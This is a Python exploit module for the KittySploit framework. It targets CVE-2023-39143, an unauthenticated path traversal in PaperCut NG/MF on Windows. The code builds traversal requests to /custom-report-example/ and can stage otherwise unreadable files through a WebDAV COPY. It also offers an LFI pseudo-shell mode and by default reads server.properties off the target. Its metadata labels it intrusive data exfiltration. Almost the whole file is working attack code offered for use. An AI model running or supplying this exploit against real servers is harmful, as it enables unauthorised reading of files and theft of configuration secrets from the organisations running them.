#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2023-39143 — PaperCut NG/MF Windows path traversal file read."""

from __future__ import annotations

import base64
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        "name": "PaperCut Path Traversal File Read (CVE-2023-39143)",
        "description": (
            "Reads files from unpatched PaperCut NG/MF on Windows (< 22.1.3) via "
            "CustomReportExample path traversal. Optional WebDAV COPY stages "
            "unreadable paths into data/scan/webdav before download."
        ),
        "author": ["Horizon3", "KittySploit Team"],
        "cve": ["CVE-2023-39143"],
        "platform": Platform.WINDOWS,
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2023-39143",
            "https://www.horizon3.ai/attack-research/disclosures/cve-2023-39143-papercut-path-traversal-file-upload-rce-vulnerability/",
        ],
        "tags": ["papercut", "printer", "path-traversal", "file-read", "unauth", "cve-2023-39143"],
        "agent": {
            "risk": "intrusive",
            "effects": ["data_exfiltration"],
            "expected_requests": 3,
            "reversible": True,
            "approval_required": True,
            "produces": ["risk_signals"],
            "requires": {
                "tech_hints_any": ["papercut"],
                "endpoint_pattern_any": ["/custom-report-example/"],
            },
            "chain": {
                "produces_capabilities": [{"capability": "file_read", "from_detail": "CustomReportExample traversal"}],
                "suggested_followups": ["scanner/http/cve_2023_39143_detect"],
            },
        },
    }

    port = OptPort(9191, "PaperCut HTTP port", True)
    ssl = OptBool(True, "Use HTTPS (WebDAV COPY requires TLS on many builds)", True)
    traversal_depth = OptInteger(3, "Number of ..\\ segments before the target path", False, advanced=True)
    webdav_user = OptString("", "WebDAV username for COPY staging (optional)", False, advanced=True)
    webdav_pass = OptString("", "WebDAV password for COPY staging (optional)", False, advanced=True)
    file_read = OptString("server.properties", "Remote file path relative to PaperCut root", True)
    output_file = OptString("", "Local path to write retrieved content", False)
    output_limit = OptInteger(12000, "Max chars to print when output_file empty (0=full)", False, advanced=True)

    _PNG_SIG = "89504e470d0a1a0a"

    def _origin(self) -> str:
        scheme = "https" if bool(self.ssl) else "http"
        return f"{scheme}://{self.target}:{int(self.port)}"

    def _traversal_prefix(self) -> str:
        depth = max(1, int(self.traversal_depth or 3))
        return "..\\" * depth

    def _read_url(self, relative_path: str) -> str:
        rel = str(relative_path or "").replace("/", "\\").lstrip("\\")
        return f"/custom-report-example/{self._traversal_prefix()}{rel}"

    def _http_read(self, relative_path: str) -> tuple[int, bytes]:
        response = self.http_request(
            method="GET",
            path=self._read_url(relative_path),
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response:
            return 0, b""
        return int(response.status_code or 0), response.content or b""

    def _webdav_copy(self, source_relative: str) -> tuple[bool, str]:
        user = str(self.webdav_user or "").strip()
        password = str(self.webdav_pass or "").strip()
        if not user or not password:
            return False, ""
        staging = secrets.token_hex(8) + ".png"
        source = str(source_relative or "").replace("/", "\\").lstrip("\\")
        origin = self._origin()
        headers = {
            "Destination": f"{origin}/webdav/{staging}",
            "Overwrite": "T",
            "Authorization": f"Basic {base64.b64encode(f'{user}:{password}'.encode()).decode()}",
        }
        response = self.http_request(
            method="COPY",
            path=f"/webdav/{self._traversal_prefix()}{source}",
            headers=headers,
            allow_redirects=False,
            timeout=int(self.timeout or 20),
        )
        if not response or int(response.status_code or 0) not in (201, 204, 200):
            return False, ""
        return True, f"data\\scan\\webdav\\{staging}"

    def execute(self, file_path: str) -> str:
        rel = str(file_path or "").strip()
        status, body = self._http_read(rel)
        if status == 200 and body and self._PNG_SIG not in body.hex():
            return body.decode("utf-8", errors="replace")
        ok, staged = self._webdav_copy(rel)
        if not ok:
            if status == 200 and body:
                return body.decode("utf-8", errors="replace")
            return ""
        status, body = self._http_read(staged)
        if status != 200 or not body:
            return ""
        return body.decode("utf-8", errors="replace")

    def run(self):
        if bool(self.shell_lfi):
            print_status("PaperCut CVE-2023-39143 LFI pseudo-shell")
            self.handler_lfi()
            return True

        target = str(self.file_read or "server.properties").strip()
        print_status(f"Reading {target} via PaperCut path traversal")
        data = self.execute(target)
        if not data:
            print_error("File read failed — try webdav_user/webdav_pass for COPY staging")
            return False

        local = str(self.output_file or "").strip()
        if local:
            with open(local, "w", encoding="utf-8", errors="ignore") as fh:
                fh.write(data)
            print_success(f"Wrote {len(data)} bytes to {local}")
        else:
            limit = int(self.output_limit or 0)
            print_info(data if limit <= 0 else data[:limit] + "\n... [truncated]")
        return True
